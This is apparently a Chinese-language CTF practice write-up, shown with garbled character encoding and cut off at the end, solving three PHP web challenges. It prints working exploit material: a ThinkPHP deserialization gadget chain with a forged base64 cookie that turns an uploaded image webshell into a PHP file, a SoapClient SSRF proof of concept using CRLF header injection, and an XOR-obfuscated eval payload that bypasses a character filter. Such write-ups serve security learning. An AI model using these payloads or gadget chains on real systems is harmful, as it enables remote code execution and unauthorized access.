$this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        &#125;        if($this-&gt;ext) &#123;            if(getimagesize($this-&gt;filename_tmp)) &#123;                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;                $this-&gt;update_img();            &#125;else&#123;                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;));            &#125;        &#125;else&#123;            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;));        &#125;    &#125;    public function update_img()&#123;        $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123;            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123;                $this-&gt;update_cookie();                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;));            &#125;else&#123;                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;));            &#125;        &#125;    &#125;    public function update_cookie()&#123;        $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img;        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);    &#125;    public function ext_check()&#123;        $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename);        $this-&gt;ext&#x3D;end($ext_arr);        if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123;            return 1;        &#125;else&#123;            return 0;        &#125;    &#125;    public function __get($name)    &#123;        return $this-&gt;except[$name];    &#125;    public function __call($name, $arguments)    &#123;        if($this-&gt;&#123;$name&#125;)&#123;            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);        &#125;    &#125;&#125;</code></pre><p>è¿™æ˜¯æ§åˆ¶æ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152858757.png" alt="image-20220411152858757"></p><p>è¿™é‡Œå°±æ˜¯æ§åˆ¶ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åçš„ä½ç½®ã€‚è¿™é‡Œæœ‰ä¸‰ä¸ªifä¸ºäº†ä¿è¯æˆ‘ä»¬èƒ½æˆåŠŸæ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¿…é¡»ç»•è¿‡å‰ä¸¤ä¸ªifç„¶åè¿›å…¥ç¬¬ä¸‰ä¸ªã€‚ä¹Ÿå°±æ˜¯è®©checkerä¸º0ï¼Œç„¶åä¿®æ”¹cookieæ—¶ä¸ä¼ æ–‡ä»¶ï¼Œext=1ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½è¿›å…¥ç¬¬ä¸‰ä¸ªifä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411163055415.png" alt="image-20220411163055415"></p><p>ä½†æ˜¯è¿™é‡Œå¯¹ä¸Šä¼ çš„æ ¼å¼æœ‰ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥åªèƒ½ä¼ å›¾ç‰‡äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411180326707.png" alt="image-20220411180326707"></p><p>è¿™é‡Œæ˜¯è¦åˆ©ç”¨å›¾ç‰‡é©¬</p><p>å†çœ‹ä¸‹é¢çš„copyï¼Œå°†filename_tmpé‡Œçš„å†…å®¹å¤åˆ¶åˆ°filenameé‡Œ</p><p>è€Œè¿™ä¸¤ä¸ªå˜é‡çš„å€¼æ˜¯ä¹‹å‰èµ‹çš„</p><pre class="language-none"><code class="language-none">$this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;</code></pre><p>å°±æ˜¯è¯´åœ¨æˆ‘ä»¬ä¼ æ–‡ä»¶ä¹‹åï¼Œä»–ä¼šåˆ›é€ ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶åä¿å­˜è¿™ä¸ªæ–‡ä»¶ï¼Œå†åˆ›å»ºä¸€ä¸ªmd5åçš„æ–‡ä»¶ååŠ ä¸Š.png</p><p>å°†è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ç»™åˆ°.pngç»“å°¾çš„æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æ— è®ºæ€ä¹ˆæ ·ä¸Šä¼ æœ€ç»ˆçš„æ–‡ä»¶éƒ½è¯´.pngç»“å°¾çš„</p><p><strong>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆä¼ ä¸ªæ–‡ä»¶ï¼Œå†åˆ©ç”¨åºåˆ—åŒ–ä¿®æ”¹cookieæ¥ä¸ºè¿™ä¸¤ä¸ªå€¼é‡æ–°èµ‹å€¼ï¼Œå› ä¸ºæˆ‘ä»¬åªæ”¹äº†cookieæ²¡æœ‰ä¼ æ–‡ä»¶ï¼Œä¹Ÿå°±ä¸ä¼šè¿›å…¥ç¬¬äºŒä¸ªifåˆ¤æ–­ä¸­ï¼Œå†é€šè¿‡ç¬¬ä¸‰ä¸ªifåˆ¤æ–­çš„copyå‡½æ•°è®©æˆ‘ä»¬ä¼ çš„å›¾ç‰‡é©¬å˜æˆphpæ–‡ä»¶</strong></p><p>æ—¢ç„¶æˆ‘ä»¬æ‰¾åˆ°äº†ååºåˆ—åŒ–çš„èµ·ç‚¹ä¸ç»ˆç‚¹ï¼Œä¸­é—´çš„è¿‡ç¨‹å°±å¯ä»¥ä»profileé‡Œçš„é­”æœ¯å˜é‡ä¸‹æ‰‹äº†</p><pre class="language-none"><code class="language-none">è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ï¼›åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨ã€‚</code></pre><p>__get()ä¸­çš„return $this-&gt;except[$name];nameçš„å€¼å°±æ˜¯index(è·Ÿ__callçš„ä¸¤ä¸ªå‚æ•°çš„æ¥æºå·®ä¸å¤šï¼‰ï¼Œæ‰€ä»¥æŠŠexceptèµ‹å€¼æˆäºŒç»´æ•°ç»„ï¼Œé”®ä¸ºindexå€¼ä¸ºupload_imgå°±è¡Œäº†</p><p>æ‰€ä»¥é“¾å­æ˜¯__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img</p><p><strong>è§£é¢˜æ­¥éª¤</strong></p><p>å…ˆä¼ å›¾ç‰‡é©¬ï¼Œç„¶åæ‰¾ä¼ ä¸Šå»çš„è·¯å¾„åŠ åœ¨filename_tmpå’Œfilenameé‡Œ</p><pre class="language-none"><code class="language-none">&lt;?phpnamespace app\web\controller;use think\Controller;class Profile&#123;    public $checker &#x3D; 0;&#x2F;&#x2F;ç»•è¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­    public $filename_tmp &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;799bad5a3b514f096e69bbc4a7896cd9.png&#39;;    public $filename &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;1.php&#39; ;    public $upload_menu;    public $ext &#x3D; 1;&#x2F;&#x2F;è¿›å…¥ç¬¬ä¸‰ä¸ªifåˆ¤æ–­    public $img;    public $except &#x3D; array(&quot;index&quot;&#x3D;&gt;&quot;upload_img&quot;);&#125;class Register&#123;    public $checker;    public $registed &#x3D; 0;&#125;$a &#x3D; new Register();$a-&gt;checker &#x3D;new Profile();var_dump(base64_encode(serialize($a)));TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxLzc5OWJhZDVhM2I1MTRmMDk2ZTY5YmJjNGE3ODk2Y2Q5LnBuZyI7czo4OiJmaWxlbmFtZSI7czo0NzoiLi91cGxvYWQvY2M1NTFhYjAwNWIyZTYwZmJkYzg4ZGU4MDliMmM0YjEvMS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ&#x3D;&#x3D;</code></pre><p>æŠŠcookieæ”¹æ‰ç„¶ååˆ·æ–°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233155520.png" alt="image-20220410233155520"></p><p>ä¼šæŠ¥é”™ï¼Œä½†æ˜¯å®é™…å·²ç»ä¿®æ”¹æˆåŠŸäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233145938.png" alt="image-20220410233145938"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233226776.png" alt="image-20220410233226776"></p><p>èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233247139.png" alt="image-20220410233247139"></p><h2 id="bestphp-39-s-revenge"><a href="#bestphp-39-s-revenge" class="headerlink" title="bestphp&#39;s revenge"></a>bestphp&#39;s revenge</h2><ul><li>sessionååºåˆ—åŒ–</li><li>CRLF</li><li>å˜é‡è¦†ç›–</li><li>PHPåŸç”Ÿç±»SoapClientçš„SSRFã€‚</li></ul><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$b &#x3D; &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt; </code></pre><p>ç›´æ¥è®¿é—®flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412182406433.png" alt="image-20220412182406433"></p><p>å‘ç°è¦æœ¬åœ°è®¿é—®ï¼Œå†ç»“åˆsession_startå‡½æ•°ï¼ŒçŒœæµ‹æ˜¯è¦åˆ©ç”¨sessionååºåˆ—åŒ–</p><p><strong>sessionååºåˆ—åŒ–</strong></p><p>phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚<br>å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚</p><p>sessionååºåˆ—åŒ–äº§ç”Ÿçš„åŸå› æ˜¯ç”±äºåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å¤„ç†å™¨çš„ä¸åŒå¯¼è‡´çš„ï¼Œé»˜è®¤æ˜¯php</p><p>å¯ä»¥ç”¨<code>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™)</code>æ¥è§„å®š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412182535003.png" alt="image-20220412182535003"></p><p>å¦‚æœå…ˆåˆ©ç”¨php_serializeå¤„ç†å™¨è¿›è¡Œåºåˆ—åŒ–ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„å€¼ä¸º<code>|O:4:â€œtestâ€:0:&#123;&#125;</code>æ—¶ï¼Œåºåˆ—åŒ–çš„ç»“æœå°±ç±»ä¼¼ä¸<code>a:1:&#123;s:1:â€œaâ€;s:16:&quot;|O:4:â€œtestâ€:0:&#123;&#125;&quot;;&#125;</code>ï¼Œè€Œå¦‚æœç”¨phpå¤„ç†å™¨ååºåˆ—åŒ–ï¼Œä¼šæŠŠa:1:{s:1:â€œaâ€;s:16:&quot;çœ‹ä½œé”®åï¼Œå°†è¿™æ®µå½“ä½œçœŸæ­£çš„åºåˆ—åŒ–ä¹‹åçš„ç»“æœæ¥è¿›è¡Œååºåˆ—åŒ–<code>O:4:â€œtestâ€:0:&#123;&#125;&quot;</code></p><p><strong>CRLF</strong></p><p>çœ‹çœ‹pç‰›çš„æ–‡ç« [CRLF Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ - phith0n (wooyun.js.org)](<a href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ.html)</p><p>CRLFæ˜¯â€å›è½¦ + æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLF Injectionåˆå«HTTP Response Splittingï¼Œç®€ç§°HRSã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨æ¢è¡Œç¬¦åœ¨å“åº”å¤´é‡Œæ³¨å…¥ä¸€äº›ä¸œè¥¿</p><p><strong>SoapClient</strong></p><p>è¿™éƒ¨åˆ†æˆ‘ç›´æ¥è´´åˆ«çš„å¸ˆå‚…çš„åšå®¢å†…å®¹äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412203513020.png" alt="image-20220412203513020"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412204001734.png" alt="image-20220412204001734"></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102960092"> bestphp&#39;s revenge_æ²ç›®_01çš„åšå®¢-CSDNåšå®¢_bestphp&#39;s revenge</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412204644161.png" alt="image-20220412204644161"></p><p><a href="https://www.anquanke.com/post/id/153065#h2-5">ä»å‡ é“CTFé¢˜çœ‹SOAPå®‰å…¨é—®é¢˜ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[<a href="https://www.cnblogs.com/ophxc/p/13168611.html">LCTF]bestphp&#39;s revenge ç»™æˆ‘çš„å¯å‘å­¦ä¹  - op_hxc - åšå®¢å›­ (cnblogs.com)</a></p><p>å› ä¸ºflag.phpè¦æ±‚æœ¬åœ°ç™»å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœèƒ½ç”¨ååºåˆ—åŒ–è°ƒç”¨Soapclientæ¥è®¿é—®flag.phpå°±èƒ½å¾—åˆ°flag</p><p><strong>å˜é‡è¦†ç›–</strong></p><p>extractå‡½æ•°ä¼šå¯¼è‡´å˜é‡è¦†ç›–</p><p>çŸ¥è¯†ç‚¹äº†è§£ä¹‹åå†é‡æ–°çœ‹index.php</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$b &#x3D; &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) &#123;    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt; </code></pre><p>è¦åœ¨è°ƒç”¨Soapclientååºåˆ—åŒ–ï¼Œå°±è¦æœ‰ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è¢«è°ƒç”¨ï¼Œè€Œextractå¯ä»¥å¯¼è‡´å˜é‡è¦†ç›–ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨ç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå°†bèµ‹å€¼ä¸ºcall_user_funcï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯ array å‹çš„è¯ï¼Œä¼šå°†æ•°ç»„çš„æˆå‘˜å½“ä½œ <code>ç±»å</code> å’Œ <code>æ–¹æ³•å</code>ã€‚æ­¤æ—¶ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°çš„å†…å®¹ä¸º</p><pre class="language-none"><code class="language-none">call_user_func(call_user_func(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;))</code></pre><p>å…³äºresetå‡½æ•°ï¼šreset() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>åœ¨è¿™é‡Œå°±ç›¸å½“äº<code>$_SESSION[&#39;name&#39;]</code></p><p>æˆ‘ä»¬åªè¦ä¼ å…¥name=Soapclientå°±èƒ½å°†è¿™æ®µè¯­å¥å˜ä¸º</p><p>call_user_func(call_user_func(array(Soapclient,&#39;welcome_to_the_lctf2018&#39;)));å› ä¸ºSoapclientæ˜¾ç„¶æ²¡æœ‰welcome_to_the_lctf2018è¿™ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±ä¼šè°ƒç”¨å…¶ä¸­çš„_callæ–¹æ³•ï¼Œè§¦å‘ååºåˆ—åŒ–</p><p><strong>åœ¨ä¿®æ”¹åºåˆ—åŒ–å¼•æ“çš„éƒ¨åˆ†</strong></p><p>æ­£å¸¸çš„è¯ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨å…¥é—¨PHPçš„sessionååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ”¹å˜phpå¼•æ“çš„æ–¹æ³•æ˜¯ini_setï¼ˆï¼‰å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸æ¥å—æ•°ç»„ï¼Œcall_user_func($_GET[&#39;f&#39;], $_POST);è€Œè¿™é‡Œçš„postè¶…çº§å…¨å±€å˜é‡æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥ini_setå°±ä¸è¡Œäº†ï¼Œäºæ˜¯ä½¿ç”¨session_startæ¥ä»£æ›¿ï¼ŒåŒæ—¶å‘¢session.serialize_handler = php_serializeä¹Ÿå˜æˆäº†serialize_handler=php_serializeã€‚</p><p><strong>poc</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;$attack &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,    &#39;user_agent&#39; &#x3D;&gt; &quot;test\r\nCookie: PHPSESSID&#x3D;96sujaq7o5tl0btee8urnlsrb3\r\n&quot;,    &#39;uri&#39; &#x3D;&gt; &quot;123&quot;));$payload &#x3D; urlencode(serialize($attack));echo $payload;&#x2F;&#x2F;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22test%0D%0ACookie%3A+PHPSESSID%3D96sujaq7o5tl0btee8urnlsrb3%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412211949816.png" alt="image-20220412211949816"></p><p>ç„¶åæˆ‘ä»¬å†é€šè¿‡</p><p>extractæ¥å®ç°è§¦å‘ååºåˆ—åŒ–çš„æ“ä½œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412212102110.png" alt="image-20220412212102110"></p><p>è¿™å®é™…ä¸Šå·²ç»æˆåŠŸäº†ï¼Œç›¸å½“äºç”¨ä¸€ä¸ªPHPSESSID=96sujaq7o5tl0btee8urnlsrbçš„è´¦å·è®¿é—®åˆ°äº†flag.phpï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åªè¦å°†cookieæ”¹ä¸ºè¿™ä¸ªå°±è¡Œäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412212725115.png" alt="image-20220412212725115"></p><p>å†sessionååºåˆ—åŒ–çš„æ—¶å€™ä¸çŸ¥é“ä¸ºå•¥ç”¨è‡ªå·±çš„ä¼šæœ‰äº›é—®é¢˜ï¼Œå¯¼è‡´è¿æ¥è¶…æ—¶ï¼Œä½†æ˜¯æ¢æˆå¦å¤–çš„å°±ä¸ä¼šè¿™æ ·ï¼Œä¸Šé¢é‚£ä¸ªå°±æ˜¯ç”¨è‡ªå·±cookieçš„ç»“æœï¼Œå¡äº†å¥½ä¹…ï¼Œç„¶åå†åˆ·æ–°çš„æ—¶å€™ç¯å¢ƒéƒ½æ‰“ä¸å¼€äº†</p><p>è¿™æ˜¯ç”¨å…¶ä»–çš„cookieçš„ç»“æœ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412213433110.png" alt="image-20220412213433110"></p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>è¿™é¢˜ç¬¬äºŒä¸ªifåˆ¤æ–­å¯å¤ªæ¶å¿ƒäººäº†</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$_ &#x3D; @$_GET[&#39;_&#39;];if ( preg_match(&#39;&#x2F;[\x00- 0-9\&#39;&quot;&#96;$&amp;.,|[&#123;_defgops\x7F]+&#x2F;i&#39;, $_) )    die(&#39;rosÃ© will not do it&#39;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )    die(&#39;you are so close, omg&#39;);eval($_);?&gt;</code></pre><p>ç»•è¿‡ä¸¤ä¸ªifå°±èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªifæ­£åˆ™åŒ¹é…äº†ä¸å°‘ä¸œè¥¿</p><pre class="language-none"><code class="language-none">\x00- 0-9                       åŒ¹é…\x00åˆ°ç©ºæ ¼(\x20)ï¼Œ0-9çš„æ•°å­—&#39;&quot;&#96;$&amp;.,|[&#123;_defgops              åŒ¹é…è¿™äº›å­—ç¬¦\x7F                            åŒ¹é…DEL(\x7F)å­—ç¬¦</code></pre><p>å¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™çœ‹çœ‹<a href="https://regex101.com/">https://regex101.com/</a></p><p>æ—¢ç„¶^å’Œ~ç¬¦å·æ²¡è¢«è¿‡æ»¤ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°å¼‚æˆ–å’Œå–åç»•è¿‡ï¼Œå…ˆå–åçœ‹çœ‹phpinfo</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175001715.png" alt="image-20220413175001715"></p><p>ä¸€äº›å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸èƒ½ç”¨ï¼Œä½†æ˜¯è¿˜æœ‰scandiré‚£äº›ï¼Œå¯ä»¥ç”¨scandiré…åˆprint_fæ¥è¯»å–ç›®å½•</p><p>è¿™æ—¶å€™å°±è¦ç»•è¿‡ç¬¬äºŒä¸ªifäº†ï¼Œè¦æ±‚å‡ºç°çš„å­—ç¬¦ç§ç±»ä¸è¶…è¿‡13ä¸ªï¼Œè€Œï¼ˆï¼‰^;è¿™å·²ç»å››ä¸ªäº†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„å­—ç¬¦åªæœ‰ä¹ä¸ªï¼Œç”¨å¼‚æˆ–è¿˜è¦æœ‰ä¸€ä¸ª%ffï¼Œè¿™ä¸‹åªæœ‰å…«ä¸ªäº†</p><p>å…ˆä¸Šè„šæœ¬</p><pre class="language-none"><code class="language-none">str &#x3D; &#39;acdips&#39;target &#x3D; &#39;ntrfl&#39;for m in target:    for a in str:        for b in str:            for c in str:                if ord(a) ^ ord(b) ^ ord(c) &#x3D;&#x3D; ord(m):                    print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(m, a, b, c), )                    print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(hex(~ord(m) &amp; 0xff), hex(~ord(a) &amp; 0xff), hex(~ord(b) &amp; 0xff),hex(~ord(c) &amp; 0xff)))</code></pre><p>è¿™æ˜¯å…¶ä»–å¸ˆå‚…çš„è§£é‡Š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175440905.png" alt="image-20220413175440905"></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¯¹ç…§ç€è„šæœ¬å°†å­—ç¬¦æ›¿æ¢æ‰å°±è¡Œäº†</p><pre class="language-none"><code class="language-none">((%8f%9c%96%9c%9c%a0%9c)^(%8f%9e%96%9b%9b%a0%9e)^(%8f%8f%96%96%8c%a0%8f)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220413151805073.png" alt="image-20220413151805073"></p><p>çœ‹åˆ°äº†flagæ–‡ä»¶ï¼Œåœ¨æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥ç”¨endå°†æŒ‡é’ˆæŒ‡å‘æœ€æœ«å°¾çš„æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨readfileæˆ–è€…show_sourceè¯»å°±è¡Œäº†</p><p>payload</p><pre class="language-none"><code 